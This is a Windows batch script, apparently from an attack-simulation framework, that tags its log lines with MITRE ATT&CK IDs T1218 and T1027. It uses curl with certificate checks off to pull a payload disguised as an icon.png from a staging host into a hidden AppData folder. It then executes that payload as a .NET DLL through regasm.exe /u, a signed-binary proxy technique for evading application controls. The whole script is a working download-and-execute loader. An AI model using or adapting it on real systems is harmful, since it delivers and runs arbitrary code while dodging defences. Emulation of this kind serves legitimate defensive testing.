@echo off
SETLOCAL EnableDelayedExpansion

SET qwz=%APPDATA%\11163\b89fca93
SET mnb=fdc9ff50.txt
SET vbn=https://10.0.0.49/stage/2/icon.png?11163-7
SET plk=ITZEL-S2BO
SET oij=11163
SET uyt=7
SET rty=%PUBLIC%\\macula-simulations.log

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_start>> "!rty!" 2>nul

curl -k -s -o "!qwz!\!mnb!" "!vbn!"
SET hb_el=!errorlevel!
IF !hb_el! EQU 0 (
    SET hb_res=OK
    SET hb_err_msg=
) ELSE (
    SET hb_res=FAIL
    SET hb_err_msg=curl_failed_!hb_el!
)
echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_complete>> "!rty!" 2>nul
echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_result=!hb_el!>> "!rty!" 2>nul

IF !hb_el! NEQ 0 (
    echo [!tsvar!][DEBUG][!plk!][!oij!]: heartbeat_abort=no_dll>> "!rty!" 2>nul
    goto :done
)

SET dll_size=0
FOR %%I IN ("!qwz!\!mnb!") DO SET dll_size=%%~zI
IF !dll_size! LSS 1024 (
    echo [!tsvar!][DEBUG][!plk!][!oij!]: dll_size_fail=!dll_size!>> "!rty!" 2>nul
    goto :done
)
echo [!tsvar!][DEBUG][!plk!][!oij!]: dll_size_ok=!dll_size!>> "!rty!" 2>nul

echo [!tsvar!][DEBUG][!plk!][!oij!]: chdir_start>> "!rty!" 2>nul
cd /d "!qwz!" >nul 2>&1
SET cd_el=!errorlevel!
echo [!tsvar!][DEBUG][!plk!][!oij!]: chdir_result=!cd_el!>> "!rty!" 2>nul

echo [!tsvar!][DEBUG][!plk!][!oij!]: regasm_start>> "!rty!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u "!qwz!\!mnb!" >NUL 2>&1
SET reg_el=!errorlevel!
IF !reg_el! EQU 0 (
    SET reg_res=OK
    SET reg_err_msg=
) ELSE (
    SET reg_res=FAIL
    SET reg_err_msg=regasm_exit_!reg_el!
)
echo [!tsvar!][DEBUG][!plk!][!oij!]: regasm_result=!reg_el!>> "!rty!" 2>nul

echo [!tsvar!][TTP][!plk!][!oij!]: T1218^|System Binary Proxy Execution=!reg_res!:!reg_err_msg!>> "!rty!" 2>nul
echo [!tsvar!][TTP][!plk!][!oij!]: T1027^|Obfuscated Files or Information=!hb_res!:!hb_err_msg!>> "!rty!" 2>nul

:done
ENDLOCAL
